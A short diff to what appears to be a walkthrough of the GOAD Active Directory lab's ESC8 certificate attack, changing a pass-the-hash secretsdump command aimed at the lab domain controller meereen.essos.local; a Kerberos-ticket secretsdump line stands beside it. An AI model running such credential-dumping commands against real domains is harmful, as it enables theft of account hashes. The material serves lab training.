@@ -90,7 +90,7 @@ secretsdump -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
 
 # or with the hash
 
-secretsdump -hashes ':39d964a01c61c19fe36c71627d7ab56c' -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
+secretsdump -hashes 'aad3b435b51404eeaad3b435b51404ee:973ed18dc13ba7e75997f9d1daf8391c' -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
 ```
 
 ![esc8_with_certipy.png](/assets/blog/GOAD/esc8_with_certipy.png)
